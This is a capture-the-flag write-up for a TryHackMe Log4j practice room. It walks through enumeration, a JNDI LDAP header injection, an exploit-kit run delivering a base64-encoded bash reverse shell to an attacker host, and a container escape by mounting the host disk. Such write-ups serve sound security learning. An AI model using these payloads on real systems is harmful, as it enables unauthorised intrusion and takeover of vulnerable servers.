# Lumberjack Turtle Writeup

A Tryhackme box dealing with log4j. https://tryhackme.com/room/lumberjackturtle

## Task 1

This is just a start-up task. Launch the target and wait 7 minutes for all services to come online.

One think I like to do is add an entry in my `/etc/hosts` file for the target.
```bash
echo "{target-ip} target.thm" >> /etc/hosts
# don't forget to use two > so you append the hosts file, not overwrite it
```

## Task 2

As usual, start an nmap scan to see what ports are open.
```bash
nmap -sV -p- target.thm
```

This will reveal the target is listening on the standard ports: 22 and 80.

Browsing the website on port 80 doesn't reveal anything interesting.

### Enumerate subdirectories

Run a dirbuster or gobuster scan to see if you can enumerate any pages on the site.
```bash
gobuster dir -u target.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

This reveals a `/~logs` path. The web page doesn't have anything but tells us to look deeper.
```bash
gobuster dir -u target.thm/~logs -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```

Now we see a /~logs/log4j page. It's contents are "Hello, vulnerable world! What could we do HERE?"

For sending simple web requests I prefer [Httpie](https://httpie.io/).

With the log4j hits on the web site, let's start a listener and try adding a jndi ldap lookup to a common header.
```bash
nc -lvnp 9000
# new tab
echo "${jndi:ldap://{attack box ip}:9000}" > header.txt
http GET target.thm/~logs/log4j Accept:@header.txt
```

You will see a connection come through. This proves the server vulnerable to Log4j attacks.

Note: once the server connects back to your listener, the HTTP request will stay open until you close the connection on your side. This means you will have to stop and start your listener between requests you send to the server if you want to try this repeatedly.

### Exploit Log4j

I used https://github.com/pimps/JNDI-Exploit-Kit to attempt to exploit Log4j.

1. `git clone https://github.com/pimps/JNDI-Exploit-Kit`
1. `cd JNDI-Exploit-Kit/target`

At this point you need to prep a reverse shell. The JNDI Exploit Kit is expecting a string as a command it will make the target run.

I wanted to use a simple bash reverse shell (`bash -i >& /dev/tcp/{attacker IP}/9000 0>&1`), but had to base64 encode that, and include commands for the target to decode and run it.

I the base64 encoded shell came out to `YmFzaCAtaSA+JiAvZGV2L3RjcC97YXR0YWNrIGJveCBpcH0vOTAwMCAwPiYx`.

This will have to be passed to the exploit kit with instrutions for the target to decode and rn it.

Before we run the exploit, start a fresh listener `nc -lvnp 9000`.

Start the exploit kit with `java -jar JNDI-Exploit-Kit-1.0-SNAPSHOT-all.jar -C "echo YmFzaCAtaSA+JiAvZGV2L3RjcC97YXR0YWNrIGJveCBpcH0vOTAwMCAwPiYx | base64 -d | bash"`

The exploit kit will show you various LDAP listeners, depending on which Java version the target is running. We don't know, so I just started at the top and moved down.

```bash
echo "{ldap://{attack box ip}:1389/csnxyh" > header.txt
http GET target.thm/~logs/log4j Accept:@header.txt
```

And 💣, you'll see some logs in the Exploit Kit and your reverse shell listener will be connected. Now you're root on the attack box.

### Find the flag

You're root in the target system, but if you list `ls -las /` you'll see a `.dockerenv` file, which is a dead giveaway that you're in a container. Let's look for flags here, then try to get to the host.

Search for files with "flag" in the name:
```bash
find -name '*flag*' 2>/dev/null
```

Cat `/opt/.flag1` for the first flag.

As the room indicates, there is one more. I bet it's on the host.

### Escape the container

Let's just see what disks we have with `lsblk`

You'll see we have a 40GB disk visible? Let's try to mount it and see if it's the host OS.

```bash
mkdir /mnt/hostfs
mount /dev/xvda1 /mnt/hostfs
# since that worked we know the container was probably running in privileged mode
cd /mnt/hostfs/
ls -las
cd root
ls -las
```

Hmm, there's a folder called `...`? Take a peak there and you'll find the flag from the host.

## Useful Links

I found these resources very valuable while completing the room:
* https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
* https://infosecwriteups.com/lumberjack-turtle-writeup-29b647e9b694
* https://m3n0sd0n4ld.github.io/thm/Lumberjack-Turtle/
